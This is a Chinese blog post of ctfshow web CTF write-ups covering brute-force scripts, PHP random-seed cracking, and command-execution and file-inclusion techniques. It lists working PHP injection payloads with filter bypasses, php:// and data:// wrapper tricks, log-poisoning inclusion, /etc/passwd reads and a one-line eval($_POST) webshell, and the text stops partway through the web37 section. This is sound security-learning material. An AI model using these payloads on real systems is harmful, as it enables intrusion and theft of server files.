<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="简单记录一些笔记"><title>ctfshow-Web篇 | Disda</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.1/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.1/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.1/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"><meta name="generator" content="Hexo 6.0.0"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">ctfshow-Web篇</h1><a id="logo" href="/.">Disda</a><p class="description">Disda’s Blog</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">ctfshow-Web篇</h1><div class="post-meta">2023-04-19<span> | </span><span class="category"><a href="/categories/ctf/">ctf</a></span><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> 阅读</span></span></div><div class="post-content"><span id="more"></span>

<!-- toc -->

<ul>
<li><a href="#web%E5%85%A5%E9%97%A8">WEB入门</a><ul>
<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a><ul>
<li><a href="#web05">web05</a></li>
<li><a href="#web10">web10</a></li>
<li><a href="#web12">web12</a></li>
<li><a href="#web13">web13</a></li>
<li><a href="#web14">web14</a></li>
<li><a href="#web15">web15</a></li>
<li><a href="#web16">web16</a></li>
<li><a href="#web20">web20</a></li>
</ul>
</li>
<li><a href="#%E7%88%86%E7%A0%B4">爆破</a><ul>
<li><a href="#web21">web21</a></li>
<li><a href="#web22">web22</a></li>
<li><a href="#web23">web23</a></li>
<li><a href="#web25">web25</a></li>
<li><a href="#web28">web28</a></li>
</ul>
</li>
<li><a href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">命令执行</a><ul>
<li><a href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%96%B9%E6%B3%95%E6%B1%87%E6%80%BB">命令执行方法汇总</a></li>
<li><a href="#web37">web37</a></li>
<li><a href="#web41">web41</a></li>
<li><a href="#%E5%91%BD%E4%BB%A4%E6%88%AA%E6%96%AD">命令截断</a></li>
<li><a href="#web54">web54</a></li>
<li><a href="#web55">web55</a></li>
<li><a href="#web57">web57</a></li>
<li><a href="#web58">web58</a></li>
<li><a href="#web71">web71</a></li>
<li><a href="#web72">web72</a></li>
<li><a href="#web73">web73</a></li>
</ul>
</li>
<li><a href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">文件包含</a><ul>
<li><a href="#web80">web80</a></li>
<li><a href="#web83">web83</a></li>
<li><a href="#web87">web87</a></li>
</ul>
</li>
<li><a href="#php%E7%89%B9%E6%80%A7">php特性</a><ul>
<li><a href="#web89">web89</a></li>
<li><a href="#web90">web90</a></li>
<li><a href="#web91">web91</a></li>
<li><a href="#web93">web93</a></li>
<li><a href="#web94">web94</a></li>
<li><a href="#web97">web97</a></li>
<li><a href="#web99">web99</a></li>
<li><a href="#web100">web100</a></li>
<li><a href="#web105">web105</a></li>
<li><a href="#web108">web108</a></li>
<li><a href="#web109">web109</a></li>
<li><a href="#web110">web110</a></li>
<li><a href="#web111">web111</a></li>
<li><a href="#web112">web112</a></li>
<li><a href="#web113">web113</a></li>
<li><a href="#web123">web123</a></li>
<li><a href="#web127">web127</a></li>
<li><a href="#web129">web129</a></li>
<li><a href="#web131">web131</a></li>
<li><a href="#web134">web134</a></li>
<li><a href="#web136">web136</a></li>
<li><a href="#web141">web141</a></li>
<li><a href="#web147">web147</a></li>
<li><a href="#web149">web149</a></li>
<li><a href="#web150">web150</a></li>
<li><a href="#web150plus">web150plus</a></li>
</ul>
</li>
<li><a href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">文件上传</a><ul>
<li><a href="#web153">web153</a></li>
<li><a href="#web156">web156</a></li>
<li><a href="#web157">web157</a></li>
<li><a href="#web-159">web 159</a></li>
<li><a href="#web-160">web 160</a></li>
<li><a href="#web162">web162</a></li>
<li><a href="#web-164">web 164</a></li>
</ul>
</li>
<li><a href="#sql-%E6%B3%A8%E5%85%A5">SQL 注入</a><ul>
<li><a href="#web171">web171</a></li>
<li><a href="#web172">web172</a></li>
<li><a href="#web174">web174</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E6%84%9A%E4%BA%BA%E8%8A%82%E6%9D%AF">愚人节杯</a><ul>
<li><a href="#web">WEB</a><ul>
<li><a href="#easy_signin">easy_signin</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<!-- tocstop -->

<h1><span id="web入门">WEB入门</span></h1><h3><span id="信息收集">信息收集</span></h3><h4><span id="web05">web05</span></h4><p>phps泄露，phps存放着php<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%BA%90%E7%A0%81&spm=1001.2101.3001.7020">源码</a>,可通过尝试访问&#x2F;index.phps读取,或者尝试扫描工具扫描读取。</p>
<h4><span id="web10">web10</span></h4><p>flag信息藏在dns记录里面，使用命令</p>
<p><a target="_blank" rel="noopener" href="http://dbcha.com/">域名查询</a></p>
<h4><span id="web12">web12</span></h4><ul>
<li><p>有时候访问路径在*&#x2F;robots.txt*里面</p>
</li>
<li><p>常见的管理员页面路径：</p>
<ul>
<li>&#x2F;admin.php</li>
<li>&#x2F;admin</li>
</ul>
</li>
</ul>
<h4><span id="web13">web13</span></h4><p>题目提示了要查看文档，f12粗略看了一下，没什么线索。</p>
<p>通过dirsearch也扫不到，看了一下提示，说是要查看网页源代码，然后查找一下document关键字，果然发现了个document.pdf。</p>
<h4><span id="web14">web14</span></h4><p>看了半天源码也没看到什么东西，看了一下robots.txt也没有，再用dirsearch扫一下，发现有个editor目录，访问链接发现了一个编辑器。</p>
<p>然后利用编辑器上传的功能，发现flag文件<code>editor/attached/file/var/www/html/nothinghere/fl000g.txt</code></p>
<p>最后访问**&#x2F;nothinghere&#x2F;fl000g.txt**即可</p>
<h4><span id="web15">web15</span></h4><p>要有社工的意识，有邮箱的信息就可以去查其他信息。</p>
<h4><span id="web16">web16</span></h4><p>php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加&#x2F;tz.php 版本是雅黑PHP探针，然后查看phpinfo搜索flag</p>
<ul>
<li>chrome的wappalyzer可以查看网页的框架和语言，可以发现是php</li>
</ul>
<h4><span id="web20">web20</span></h4><ul>
<li>access数据库在&#x2F;db&#x2F;db.mdb</li>
</ul>
<h3><span id="爆破">爆破</span></h3><h4><span id="web21">web21</span></h4><p>BurpSuit可以有多种做法：</p>
<p>我们随便输入账号密码抓包时候发现Authorization中是以base64进行加密的，解密为admin:123，可能这样还比较难看出来，可以把密码加长一点试试看。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>02cc98c2-f4b7-41b3-8b16-7b9a96655edb.challenge.ctf.show</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Basic YWRtaW46MTIz</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>

<ul>
<li><p>第一种，账号密码分开。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Basic §§§§</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/19/ctfshow-Web%E7%AF%87/disda/Desktop/Disda/hexo/source/_posts/ctfshow/image-20230423162915401.png" alt="image-20230423162915401"></p>
</li>
</ul>
<p>​     <img src="/2023/04/19/ctfshow-Web%E7%AF%87/disda/Desktop/Disda/hexo/source/_posts/ctfshow/image-20230423162935303.png" alt="image-20230423162935303"></p>
<p>第二个位置加入密码本，然后其他同理。</p>
<p><img src="/2023/04/19/ctfshow-Web%E7%AF%87/disda/Desktop/Disda/hexo/source/_posts/ctfshow/image-20230423162626843.png" alt="image-20230423162626843"></p>
<ul>
<li><p>方法二：可以直接保留admin:的base64编码，然后放在payload前面</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Basic YWRtaW46§§</span><br></pre></td></tr></table></figure></li>
</ul>
<p>​		因此，只需要一个simple list即可</p>
<ul>
<li>方法三：我们还可以使用<em>payload type &#x3D; Custom iterator</em>构造三次参数<ul>
<li>第一次输入admin</li>
<li>第二次输入:</li>
<li>第三次密码字典</li>
</ul>
</li>
</ul>
<h4><span id="web22">web22</span></h4><p><a target="_blank" rel="noopener" href="http://z.zcjun.com/">子域名爆破</a></p>
<h4><span id="web23">web23</span></h4><p>阅读php源码，然后写python脚本</p>
<ul>
<li><strong>MD5加密</strong>：产生出一个128位（16字节）的散列值（hash value），用于确保信息传输完整一致。生成结果是固定的128字节，通常用一个32位的16进制字符串表示。</li>
<li><strong>PHP</strong>：substr()、intval()、以及代码分析</li>
</ul>
<p>第一种方式，字母加数字组合</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">s = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class="line">url = <span class="string">&#x27;http://7f0d474e-c019-4af7-8f95-b02664aa0411.challenge.ctf.show/&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        k = (<span class="built_in">str</span>(i)+<span class="built_in">str</span>(j)).encode(<span class="string">&#x27;utf-8&#x27;</span>)    <span class="comment"># python3中必须进行utf-8编码</span></span><br><span class="line">        token = hashlib.md5(k).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> token[<span class="number">1</span>] == token[<span class="number">14</span>] <span class="keyword">and</span> token[<span class="number">14</span>] == token[<span class="number">17</span>]:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                left = <span class="built_in">int</span>(<span class="built_in">int</span>(token[<span class="number">1</span>])+<span class="built_in">int</span>(token[<span class="number">14</span>])+<span class="built_in">int</span>(token[<span class="number">17</span>])/<span class="built_in">int</span>(token[<span class="number">1</span>]))</span><br><span class="line">                right = <span class="built_in">int</span>(token[<span class="number">31</span>])</span><br><span class="line">                <span class="keyword">if</span> left == right:</span><br><span class="line">                    <span class="built_in">print</span>(requests.get(url+<span class="string">f&#x27;/?token=<span class="subst">&#123;<span class="built_in">str</span>(i)+<span class="built_in">str</span>(j)&#125;</span>&#x27;</span>).text)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<p>第二种方式，纯数字</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&#x27;http://61535773-6957-4813-b084-0451f6607922.challenge.ctf.show/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100000</span>):</span><br><span class="line">    k = <span class="built_in">str</span>(j).encode(<span class="string">&#x27;utf-8&#x27;</span>)    <span class="comment"># python3中必须进行utf-8编码</span></span><br><span class="line">    token = hashlib.md5(k).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> token[<span class="number">1</span>] == token[<span class="number">14</span>] <span class="keyword">and</span> token[<span class="number">14</span>] == token[<span class="number">17</span>]:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            left = <span class="built_in">int</span>(<span class="built_in">int</span>(token[<span class="number">1</span>])+<span class="built_in">int</span>(token[<span class="number">14</span>])+<span class="built_in">int</span>(token[<span class="number">17</span>])/<span class="built_in">int</span>(token[<span class="number">1</span>]))</span><br><span class="line">            right = <span class="built_in">int</span>(token[<span class="number">31</span>])</span><br><span class="line">            <span class="keyword">if</span> left == right:</span><br><span class="line">                <span class="built_in">print</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(requests.get(url+<span class="string">f&#x27;/?token=<span class="subst">&#123;j&#125;</span>&#x27;</span>).text)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<h4><span id="web25">web25</span></h4><ul>
<li><p>和上一题一样，都是利用php随机数的爆破攻击，但是本题没有给种子，因此需要需要使用工具 <a target="_blank" rel="noopener" href="https://www.openwall.com/php_mt_seed/">php_mt_seed</a> 。专门用来跑mt_srand()种子和 mt_rand()随机数。</p>
<p><img src="/2023/04/19/ctfshow-Web%E7%AF%87/disda/Desktop/Disda/hexo/source/_posts/ctfshow/509478bc7d684369b08ac08f664cf67b.png" alt="img"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">种子涉及到flag，不能直接求到</span><br><span class="line"><span class="keyword">if</span>((!<span class="variable">$rand</span>)) 要使这个为真，就要让 <span class="variable">$rand</span>=<span class="number">0</span> ，</span><br><span class="line">而 <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>()) </span><br><span class="line">所以要得到随机数才能构造 <span class="variable">$r</span>=<span class="variable">$mt_rand</span>() 。</span><br></pre></td></tr></table></figure>

<p>先传参<code>/?r=0</code>获取生成随机数的负值。</p>
<p>再进行<code>./php_mt_seed 随机数</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">1267174464</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$token</span>=<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$token</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>把r&#x3D;1267174464和token放到cookie中传入，即可获取flag。</p>
</li>
</ul>
<h4><span id="web28">web28</span></h4><ul>
<li><p>一开始三个位置一起爆破，没成功，看网上wp</p>
<p>如果修改最后的2.txt会被无限重定向，不删除2.txt只修改前面的0和1依旧会被无限重定向。</p>
</li>
<li><p>因此删掉最后2.txt，用集束炸弹模式爆破前两个数字即可。</p>
</li>
</ul>
<h3><span id="命令执行">命令执行</span></h3><h4><span id="命令执行方法汇总">命令执行方法汇总</span></h4><p>但是假如我们并不知道flag在哪里呢？<br>新手可以等文件包含部分学过来再学。 我们通过响应头，发现是nginx，默认nginx日志文件在&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log 结合这里的include，构造如下语句，也可以尝试先&#x2F;etc&#x2F;passwd，确认的确可以包含。<code> http://dfa0bafe-3571-4a4a-9f0a-3766fb5a0a69.challenge.ctf.show/?c=include$_GET[a\]?%3E&amp;a=../../../../var/log/nginx/access.log</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">isset</span>() <span class="comment">#是PHP中一个常用的函数，用于检查变量是否已经被设置并且非 NULL。如果给定的变量存在且其值不为 NULL，则返回 true，否则返回 false</span></span><br><span class="line"><span class="title function_ invoke__">preg_match</span>() <span class="comment">#是PHP中用于执行正则表达式匹配的函数，它可以在给定的字符串中查找模式匹配，如果匹配成功，返回 1，否则返回 0。该函数需要传入两个参数：正则表达式模式和要搜索的字符串。还可以传递第三个参数，将匹配结果存储到其中。</span></span><br><span class="line"><span class="keyword">eval</span>() <span class="comment">#函数用于将字符串作为PHP代码执行。在执行时，该函数将传递的字符串作为 PHP 代码来执行。</span></span><br></pre></td></tr></table></figure>

<p>因为我们传入的参数能被当作php代码执行，则我们使用一些系统指令：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>tac可以直接看到，cat需要在f12源码里面看</li>
</ul>
<blockquote>
<p>空格可以用tab%09来绕过</p>
<p>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS、$IFS$1</p>
<p>对于;的过滤可以使用?&gt;</p>
<p>%0a 换行符代替 ;</p>
</blockquote>
<ul>
<li><p>方法一：拼接</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># url编码后使用%5c添加到flag中</span></span><br><span class="line">/?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>cat%<span class="number">20</span>fl%<span class="number">5</span>cag%<span class="number">2</span>Ephp%<span class="number">27</span>);</span><br><span class="line"><span class="comment"># url编码后使用$9添加到flag中</span></span><br><span class="line">/?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>cat%<span class="number">20</span>fl$<span class="number">9</span>ag%<span class="number">2</span>Ephp%<span class="number">27</span>);</span><br><span class="line"><span class="comment"># 还可以使用&#x27;&#x27;和&quot;&quot;来拼接flag 例如 fl&#x27;&#x27;ag （编不编码都试试看）</span></span><br><span class="line">/?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>cat%<span class="number">20</span>fl%<span class="number">22</span>%<span class="number">22</span>ag%<span class="number">2</span>Ephp%<span class="number">27</span>);</span><br><span class="line"><span class="comment"># 使用特殊符号$@</span></span><br><span class="line">/?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>cat%<span class="number">20</span>fl$@ag%<span class="number">2</span>Ephp%<span class="number">27</span>);</span><br><span class="line"><span class="comment"># 过滤cat后也可以通过加斜杠达到绕过的方法 ca\t</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>方法二：使用通配符</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用* cat fla*</span></span><br><span class="line">/?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>cat%<span class="number">20</span>fla*%<span class="number">27</span>);</span><br><span class="line"><span class="comment"># 使用? cat fla?.php</span></span><br><span class="line">/?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>cat%<span class="number">20</span>fla%<span class="number">3</span>F%<span class="number">2</span>Ephp%<span class="number">27</span>);</span><br><span class="line"><span class="comment"># ?可以出现任意次</span></span><br><span class="line">/?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>tac%<span class="number">20</span>fla?.???%<span class="number">27</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>方法三：使用反引号</p>
<ul>
<li>反引号的作用就是将反引号内的Linux命令先执行，然后将执行结果赋予变量。</li>
<li>由 <code>&#39;&#39;</code> 符号并不会影响命令的执行，所以我们可以插入这些符号来绕过。在linux中可以使用 ’ 来绕过，比如 fl’’ag 就等效于 flag。</li>
<li><strong>echo &#96;&#96; 和 system(‘’) 等价</strong></li>
</ul>
  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/?c=<span class="built_in">echo</span><span class="variable">%20`tac%</span><span class="number">20</span>fl<span class="variable">%27%</span><span class="number">27</span>ag.php`;</span><br><span class="line"># nl 命令：Linux中nl命令和cat命令很像，不过nl命令会打上行号，nl没有回显，需要f12查看源代码</span><br><span class="line">/?c=<span class="built_in">echo</span> `nl fl?g.php`;</span><br><span class="line"># 此外也可以用&#x27;&#x27;来绕过过滤</span><br><span class="line"><span class="built_in">echo</span> `nl fl&#x27;&#x27;ag.p&#x27;&#x27;hp`;</span><br></pre></td></tr></table></figure>
</li>
<li><p>方法四：复制大法</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cp fla* 1.txt,然后访问目录下的1.txt即可</span></span><br><span class="line">?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>cp%<span class="number">20</span>fla*%<span class="number">201</span>.txt%<span class="number">27</span>);</span><br><span class="line"><span class="comment"># 同理，如果屏蔽system，也可以使用exec</span></span><br><span class="line">?c=<span class="title function_ invoke__">exec</span>(%<span class="number">27</span>cp%<span class="number">20</span>fla*%<span class="number">201</span>.txt%<span class="number">27</span>);</span><br><span class="line"><span class="comment"># 同理还有passthru</span></span><br><span class="line">/?c=<span class="title function_ invoke__">passthru</span>(%<span class="number">27</span>cp%<span class="number">20</span>fla*%<span class="number">201</span>.txt%<span class="number">27</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>方法五：利用参数输入+eval</p>
<ul>
<li>由于系统只会检测$c中的内容，则我们通过eval()函数构造参数1巧妙绕过</li>
</ul>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ?c=eval($_GET[1]);&amp;1=system(&#x27;tac flag.php&#x27;);</span></span><br><span class="line">/?c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>tac%<span class="number">20</span>flag.php%<span class="number">27</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>方法六：文件包含</p>
<ul>
<li>使用include将1包含进来，1再使用php伪协议使用PHP内部设置的过滤器，将flag.php文件读取并以base64编码的格式返回</li>
</ul>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 其中$_GET也可以改成$_REQUEST</span></span><br><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>];&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line"></span><br><span class="line">?c=<span class="keyword">require</span> <span class="variable">$_GET</span>[<span class="number">1</span>];&amp;<span class="number">1</span>=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[a];&amp;a=data:<span class="comment">//text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="variable">$_GET</span>[a];&amp;a=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>方法七：一句话木马</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>
</li>
<li><p>方法八：</p>
<blockquote>
<p>localeconv() 函数返回一包含本地数字及货币格式信息的数组。<br>pos() 函数返回数组中当前元素（指针指向）的值。<br>scandir() 函数返回指定目录中的文件和数组。<br>array_reverse() 将数组倒序输出。<br>next() 将指针指向数组的下一个元素并输出。<br>show_source() 对文件进行语法高亮显示，是highlight_file()别名。</p>
</blockquote>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br><span class="line"><span class="comment"># 等价</span></span><br><span class="line">?c=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()))));</span><br><span class="line"><span class="comment"># 其中show_source可以换成highlight_file和readfile</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>所以，语句的步骤是<br>先拿到一个.&#x3D;&#x3D;》localeconv() pos()</p>
<p>接着扫描.目录，即当前目录&#x3D;&#x3D;》scandir()</p>
<p>将扫描完的目录倒叙&#x3D;》array_reverse(),因为正序第一第二分别是: . ..</p>
<p>将倒序完毕的数组的第二个元素输出&#x3D;&#x3D;》next() </p>
<p>​	- 因为目录的顺序分别是. .. flag.php index.php因此我们倒序后第二个是flag.php</p>
<p>打印文件信息&#x3D;&#x3D;》show_source()</p>
</blockquote>
</li>
<li><p>方法九：</p>
<p><a target="_blank" rel="noopener" href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">RCE</a> </p>
<ul>
<li><p>可以通过</p>
<ul>
<li>$_GET</li>
<li>$_POST</li>
<li>$_FILES</li>
<li>$_COOKIE</li>
</ul>
<p><code>?c=eval(end(current(get_defined_vars())));&amp;a=system(&quot;cat flag.php&quot;);</code></p>
</li>
</ul>
</li>
</ul>
<h4><span id="web37">web37</span></h4><ul>
<li><p>知识点</p>
<ul>
<li>考察data协议</li>
</ul>
</li>
<li><p>data伪协议：将后面的字符当做PHP代码执行</p>
